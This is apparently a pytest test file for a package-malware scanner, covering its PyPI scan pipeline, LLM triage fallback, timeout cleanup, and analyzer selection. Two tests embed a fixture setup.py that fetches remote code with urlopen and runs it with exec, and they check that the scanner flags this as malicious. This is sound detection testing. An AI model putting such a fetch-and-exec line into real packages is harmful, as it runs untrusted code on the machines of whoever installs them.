# SPDX-License-Identifier: AGPL-3.0-or-later
import hashlib
import io
import tarfile
import zipfile
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest
from sqlalchemy import select

from pkgward.store import session as sess
from pkgward.store.models import (
    Finding,
    Package,
    Scan,
    ScanQueue,
    Version,
    Watchlist,
)


def _tgz(data: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for name, blob in data.items():
            info = tarfile.TarInfo(name)
            info.size = len(blob)
            t.addfile(info, io.BytesIO(blob))
    return buf.getvalue()


def _whl(data: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, blob in data.items():
            z.writestr(name, blob)
    return buf.getvalue()


@pytest.mark.asyncio
async def test_pipeline_clean_package(httpx_mock, tmp_path, monkeypatch):
    monkeypatch.setenv("PKGWARD_DB_URL", f"sqlite:///{tmp_path/'p.db'}")
    from pkgward.ecosystems.pypi.fetch import download as dl
    monkeypatch.setattr(dl, "WORK_ROOT", tmp_path)
    sess.reset_engine()
    sess.init_db()
    import pkgward.ecosystems.pypi  # noqa: F401

    sdist_bytes = _tgz({"setup.py": b"from setuptools import setup\nsetup(name='foo')\n",
                        "foo/__init__.py": b""})
    whl_bytes = _whl({"foo/__init__.py": b""})
    payload = {
        "info": {"name": "foo", "version": "1.0"},
        "urls": [
            {"packagetype": "sdist", "filename": "foo-1.0.tar.gz",
             "url": "https://files.pythonhosted.org/foo/foo-1.0.tar.gz",
             "digests": {"sha256": hashlib.sha256(sdist_bytes).hexdigest()}},
            {"packagetype": "bdist_wheel", "filename": "foo-1.0-py3-none-any.whl",
             "url": "https://files.pythonhosted.org/foo/foo-1.0-py3-none-any.whl",
             "digests": {"sha256": hashlib.sha256(whl_bytes).hexdigest()}},
        ],
    }
    httpx_mock.add_response(url="https://pypi.org/pypi/foo/1.0/json", json=payload)
    httpx_mock.add_response(url=payload["urls"][0]["url"], content=sdist_bytes)
    httpx_mock.add_response(url=payload["urls"][1]["url"], content=whl_bytes)

    with sess.session_scope() as s:
        q = ScanQueue(ecosystem="pypi", name="foo", version="1.0",
                      priority="normal", status="claimed", claim_token="test-tok")
        s.add(q)
        s.flush()
        qid = q.id

    from pkgward.pipeline import process_one
    await process_one(qid, "test-tok")

    with sess.session_scope() as s:
        scan = s.scalars(select(Scan)).one()
        assert scan.verdict == "clean"
        assert s.get(ScanQueue, qid).status == "done"


@pytest.mark.asyncio
async def test_pipeline_malicious_setup_py(httpx_mock, tmp_path, monkeypatch):
    monkeypatch.setenv("PKGWARD_DB_URL", f"sqlite:///{tmp_path/'p2.db'}")
    from pkgward.ecosystems.pypi.fetch import download as dl
    monkeypatch.setattr(dl, "WORK_ROOT", tmp_path)
    sess.reset_engine()
    sess.init_db()
    import pkgward.ecosystems.pypi  # noqa: F401

    evil = (b"import urllib.request\n"
            b"exec(urllib.request.urlopen('http://x').read())\n"
            b"from setuptools import setup\nsetup(name='bad')\n")
    sdist_bytes = _tgz({"bad-1/setup.py": evil})
    whl_bytes = _whl({"bad/__init__.py": b""})
    payload = {
        "info": {"name": "bad", "version": "1.0"},
        "urls": [
            {"packagetype": "sdist", "filename": "bad-1.0.tar.gz",
             "url": "https://files.pythonhosted.org/bad/bad-1.0.tar.gz",
             "digests": {"sha256": hashlib.sha256(sdist_bytes).hexdigest()}},
            {"packagetype": "bdist_wheel", "filename": "bad-1.0-py3-none-any.whl",
             "url": "https://files.pythonhosted.org/bad/bad-1.0-py3-none-any.whl",
             "digests": {"sha256": hashlib.sha256(whl_bytes).hexdigest()}},
        ],
    }
    httpx_mock.add_response(url="https://pypi.org/pypi/bad/1.0/json", json=payload)
    httpx_mock.add_response(url=payload["urls"][0]["url"], content=sdist_bytes)
    httpx_mock.add_response(url=payload["urls"][1]["url"], content=whl_bytes)

    with sess.session_scope() as s:
        q = ScanQueue(ecosystem="pypi", name="bad", version="1.0",
                      priority="normal", status="claimed", claim_token="test-tok")
        s.add(q)
        s.flush()
        qid = q.id

    from pkgward.pipeline import process_one
    await process_one(qid, "test-tok")

    with sess.session_scope() as s:
        scan = s.scalars(select(Scan)).one()
        assert scan.verdict == "malicious"
        rule_ids = {f.rule_id for f in s.scalars(select(Finding)).all()}
        assert "installer.urlopen_exec_chain" in rule_ids


@pytest.mark.asyncio
async def test_pipeline_keeps_rule_verdict_when_llm_skipped(httpx_mock, tmp_path, monkeypatch):
    monkeypatch.setenv("PKGWARD_DB_URL", f"sqlite:///{tmp_path/'p3.db'}")
    from pkgward.ecosystems.pypi.fetch import download as dl
    monkeypatch.setattr(dl, "WORK_ROOT", tmp_path)
    sess.reset_engine()
    sess.init_db()
    import pkgward.ecosystems.pypi  # noqa: F401

    evil = (b"import urllib.request\n"
            b"exec(urllib.request.urlopen('http://x').read())\n"
            b"from setuptools import setup\nsetup(name='bad')\n")
    sdist_bytes = _tgz({"bad-1/setup.py": evil})
    whl_bytes = _whl({"bad/__init__.py": b""})
    payload = {
        "info": {"name": "bad", "version": "1.0"},
        "urls": [
            {"packagetype": "sdist", "filename": "bad-1.0.tar.gz",
             "url": "https://files.pythonhosted.org/bad/bad-1.0.tar.gz",
             "digests": {"sha256": hashlib.sha256(sdist_bytes).hexdigest()}},
            {"packagetype": "bdist_wheel", "filename": "bad-1.0-py3-none-any.whl",
             "url": "https://files.pythonhosted.org/bad/bad-1.0-py3-none-any.whl",
             "digests": {"sha256": hashlib.sha256(whl_bytes).hexdigest()}},
        ],
    }
    httpx_mock.add_response(url="https://pypi.org/pypi/bad/1.0/json", json=payload)
    httpx_mock.add_response(url=payload["urls"][0]["url"], content=sdist_bytes)
    httpx_mock.add_response(url=payload["urls"][1]["url"], content=whl_bytes)

    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-fake")
    from pkgward.llm import triage as llm_triage_mod
    from pkgward.llm.triage import LLMTriageResult

    def _skipped(**kwargs):
        return LLMTriageResult(
            verdict="skipped", confidence=0.0, reasoning="budget: test",
            iocs=[], agrees_with_rules=None, model="test-model",
            prompt_tokens=0, completion_tokens=0, cost_usd=0.0,
            latency_ms=0, raw_response={"skipped": "test"},
        )
    monkeypatch.setattr(llm_triage_mod, "triage", _skipped)

    with sess.session_scope() as s:
        q = ScanQueue(ecosystem="pypi", name="bad", version="1.0",
                      priority="normal", status="claimed", claim_token="test-tok")
        s.add(q)
        s.flush()
        qid = q.id

    from pkgward.pipeline import process_one
    await process_one(qid, "test-tok")

    with sess.session_scope() as s:
        scan = s.scalars(select(Scan)).one()
        assert scan.verdict == "malicious"
        assert scan.llm_verdict == "skipped"


@pytest.mark.asyncio
async def test_extract_tree_survives_timeout_cancel_during_persist(httpx_mock, tmp_path, monkeypatch):
    """openprogram 0.5.0 (scan 181813): the 900s worker timeout cancels only the
    coroutine — the _persist_and_finalize thread keeps running into LLM triage.
    The coroutine's finally used to rmtree the extract tree immediately, so triage
    walked a deleted dir, gathered NO source, and the LLM adjudicated blind.
    The tree must survive until the persist thread finishes, then be cleaned."""
    import asyncio
    import threading

    monkeypatch.setenv("PKGWARD_DB_URL", f"sqlite:///{tmp_path/'p4.db'}")
    from pkgward.ecosystems.pypi.fetch import download as dl
    monkeypatch.setattr(dl, "WORK_ROOT", tmp_path)
    sess.reset_engine()
    sess.init_db()
    import pkgward.ecosystems.pypi  # noqa: F401

    sdist_bytes = _tgz({"foo-1/setup.py": b"from setuptools import setup\nsetup(name='foo')\n"})
    whl_bytes = _whl({"foo/__init__.py": b""})
    payload = {
        "info": {"name": "foo", "version": "1.0"},
        "urls": [
            {"packagetype": "sdist", "filename": "foo-1.0.tar.gz",
             "url": "https://files.pythonhosted.org/foo/foo-1.0.tar.gz",
             "digests": {"sha256": hashlib.sha256(sdist_bytes).hexdigest()}},
            {"packagetype": "bdist_wheel", "filename": "foo-1.0-py3-none-any.whl",
             "url": "https://files.pythonhosted.org/foo/foo-1.0-py3-none-any.whl",
             "digests": {"sha256": hashlib.sha256(whl_bytes).hexdigest()}},
        ],
    }
    httpx_mock.add_response(url="https://pypi.org/pypi/foo/1.0/json", json=payload)
    httpx_mock.add_response(url=payload["urls"][0]["url"], content=sdist_bytes)
    httpx_mock.add_response(url=payload["urls"][1]["url"], content=whl_bytes)

    import pkgward.pipeline as pipeline_mod

    gate = threading.Event()
    entered = threading.Event()
    seen: dict = {}

    real_persist = pipeline_mod._persist_and_finalize

    def slow_persist(**kwargs):
        seen["tmp_extract"] = kwargs["tmp_extract"]
        entered.set()
        gate.wait(timeout=15)  # hold "mid-persist" while the coroutine is cancelled
        seen["tree_alive_at_triage_time"] = kwargs["tmp_extract"].exists()
        real_persist(**kwargs)

    monkeypatch.setattr(pipeline_mod, "_persist_and_finalize", slow_persist)

    with sess.session_scope() as s:
        q = ScanQueue(ecosystem="pypi", name="foo", version="1.0",
                      priority="normal", status="claimed", claim_token="test-tok")
        s.add(q)
        s.flush()
        qid = q.id

    task = asyncio.create_task(pipeline_mod.process_one(qid, "test-tok"))
    await asyncio.to_thread(entered.wait, 15)
    task.cancel()  # what asyncio.wait_for does at the 900s worker timeout
    with pytest.raises(asyncio.CancelledError):
        await task

    tmp_extract = seen["tmp_extract"]
    assert tmp_extract.exists(), "cancel must not rmtree the tree under the running persist thread"

    gate.set()  # let the persist thread run on to triage + cleanup
    for _ in range(150):
        if not tmp_extract.exists():
            break
        await asyncio.sleep(0.1)
    assert not tmp_extract.exists(), "persist thread must clean the tree at its end"


def test_run_analyzers_skips_python_specific_for_crates():
    """analyze_imports and analyze_malware_patterns must NOT run for non-pypi."""
    from pkgward.pipeline import _run_analyzers

    sub = Path("/tmp/fake")
    with patch("pkgward.pipeline.analyze_imports") as mock_imports, \
         patch("pkgward.pipeline.analyze_malware_patterns") as mock_malware, \
         patch("pkgward.pipeline.analyze_iocs", return_value=[]), \
         patch("pkgward.pipeline.analyze_entropy", return_value=[]), \
         patch("pkgward.pipeline.analyze_entropy_delta", return_value=[]), \
         patch("pkgward.pipeline.analyze_binary_artifacts", return_value=[]), \
         patch("pkgward.pipeline.analyze_yara", return_value=[]):
        _run_analyzers(sub, None, {}, {}, {}, ecosystem="crates")
        mock_imports.assert_not_called()
        mock_malware.assert_not_called()


def test_run_analyzers_runs_python_specific_for_pypi():
    """analyze_imports and analyze_malware_patterns MUST run for pypi."""
    from pkgward.pipeline import _run_analyzers

    sub = Path("/tmp/fake")
    with patch("pkgward.pipeline.analyze_imports", return_value=[]) as mock_imports, \
         patch("pkgward.pipeline.analyze_malware_patterns", return_value=[]) as mock_malware, \
         patch("pkgward.pipeline.analyze_iocs", return_value=[]), \
         patch("pkgward.pipeline.analyze_entropy", return_value=[]), \
         patch("pkgward.pipeline.analyze_entropy_delta", return_value=[]), \
         patch("pkgward.pipeline.analyze_binary_artifacts", return_value=[]), \
         patch("pkgward.pipeline.analyze_yara", return_value=[]):
        _run_analyzers(sub, None, {}, {}, {}, ecosystem="pypi")
        mock_imports.assert_called_once()
        mock_malware.assert_called_once()
